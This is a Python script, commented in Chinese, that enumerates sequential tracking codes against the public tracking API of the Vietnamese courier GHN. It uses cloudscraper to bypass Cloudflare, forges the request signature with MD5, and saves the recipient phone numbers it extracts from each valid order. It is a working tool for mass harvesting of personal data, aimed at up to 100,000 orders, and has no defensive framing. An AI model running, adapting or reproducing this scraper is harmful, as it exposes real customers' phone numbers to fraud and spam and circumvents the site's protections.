#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
10万订单扫描脚本 - 修复Cloudflare版本
使用方法：
1. pip3 install cloudscraper
2. python3 扫描订单_修复版.py
"""

import cloudscraper
import hashlib
import time
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

# ==================== 配置参数 ====================
CONFIG = {
    'target': 10,               # 目标订单数（测试用10，可改成100、1000、100000）
    'total_threads': 3,         # 并发线程数
    'delay': 0.5,               # 请求间隔（秒）
    'timeout': 15,              # 超时时间（秒）
    'save_every': 5,            # 每5个保存一次
    'max_98_retries': 10,       # Code:98 最大重试次数
}

# ==================== 密集区域 ====================
DENSE_REGIONS = [
    # 最密集的几个区域测试
    {'prefix': 'EC', 'start': 149780335, 'end': 149780809, 'priority': 1, 'step': 1, 'name': 'EC_超密'},
    {'prefix': 'EF', 'start': 43571495, 'end': 43571600, 'priority': 1, 'step': 1, 'name': 'EF_超密'},
    {'prefix': 'EB', 'start': 102885483, 'end': 102885600, 'priority': 1, 'step': 1, 'name': 'EB_测试'},
]

# ==================== 全局状态 ====================
state = {
    'found': 0,
    'tested': 0,
    'start_time': time.time(),
    'orders': [],
    'lock': Lock(),
}

# 创建 cloudscraper session（绕过Cloudflare）
scraper = cloudscraper.create_scraper()

# ==================== 查询订单 ====================
def query_order(code):
    url = "https://donhang.ghn.vn/api/v1/public/tracking/search"
    signature_str = f"code={code}&source=tracking_page"
    signature = hashlib.md5(signature_str.encode()).hexdigest()
    
    payload = {"code": code, "signature": signature, "source": "tracking_page"}
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    for attempt in range(CONFIG['max_98_retries']):
        try:
            response = scraper.post(url, json=payload, headers=headers, timeout=CONFIG['timeout'])
            
            if response.status_code != 200:
                print(f".", end='', flush=True)
                time.sleep(1)
                continue
                
            data = response.json()
            code_value = data.get('Code', 0)
            
            if code_value == 98:
                print(f"98..", end='', flush=True)
                time.sleep(0.5)
                continue
            
            if code_value == 1:
                return data.get('Data'), "SUCCESS"
            else:
                return None, f"Code:{code_value}"
                
        except Exception as e:
            print(f"E", end='', flush=True)
            time.sleep(1)
            continue
    
    return None, "MAX_RETRY"

# ==================== 扫描区域 ====================
def scan_region(region):
    prefix = region['prefix']
    start = region['start']
    end = region['end']
    step = region['step']
    name = region['name']
    
    print(f"\n🔍 扫描 [{name}] {prefix}{start:09d}-{prefix}{end:09d}")
    
    for num in range(start, end + 1, step):
        if state['found'] >= CONFIG['target']:
            break
        
        code = f"{prefix}{num:09d}VN"
        data, status = query_order(code)
        
        with state['lock']:
            state['tested'] += 1
        
        if status == "SUCCESS" and data:
            phone = "N/A"
            if 'OrderInfo' in data:
                for item in data['OrderInfo']:
                    if item.get('Key') == 'Người nhận':
                        value = item.get('Value', '')
                        phone_match = re.search(r'\d{10,11}', value)
                        if phone_match:
                            phone = phone_match.group()
                        break
            
            with state['lock']:
                state['found'] += 1
                state['orders'].append({'code': code, 'phone': phone})
                
                elapsed = time.time() - state['start_time']
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                rate = (state['found'] / state['tested'] * 100) if state['tested'] > 0 else 0
                
                print(f"\n✅ [{state['found']}/{CONFIG['target']}] {code} | 📞 {phone} | ⚡ {speed:.1f}/s | 成功率:{rate:.2f}%")
        
        time.sleep(CONFIG['delay'])

# ==================== 保存结果 ====================
def save_progress():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    txt_file = f"orders_{timestamp}.txt"
    
    with open(txt_file, 'w', encoding='utf-8') as f:
        for order in state['orders']:
            f.write(f"{order['code']}\t{order['phone']}\n")
    
    print(f"\n💾 已保存 {state['found']} 个订单到 {txt_file}")

# ==================== 主程序 ====================
def main():
    print("="*80)
    print("🚀 订单扫描系统（Cloudflare修复版）")
    print("="*80)
    print(f"📊 线程: {CONFIG['total_threads']} | 目标: {CONFIG['target']:,}")
    print(f"📊 密集区域: {len(DENSE_REGIONS)} 个")
    print("="*80)
    
    with ThreadPoolExecutor(max_workers=CONFIG['total_threads']) as executor:
        futures = [executor.submit(scan_region, region) for region in DENSE_REGIONS if state['found'] < CONFIG['target']]
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"\n❌ 异常: {e}")
    
    save_progress()
    
    elapsed = time.time() - state['start_time']
    print("\n" + "="*80)
    print("📊 扫描完成！")
    print("="*80)
    print(f"✅ 找到订单: {state['found']:,}")
    print(f"🔍 已测试: {state['tested']:,}")
    print(f"⚡ 成功率: {state['found']/state['tested']*100:.2f}%" if state['tested'] > 0 else "0%")
    print(f"⏱️  总耗时: {elapsed:.1f} 秒")
    print("="*80)

if __name__ == "__main__":
    main()
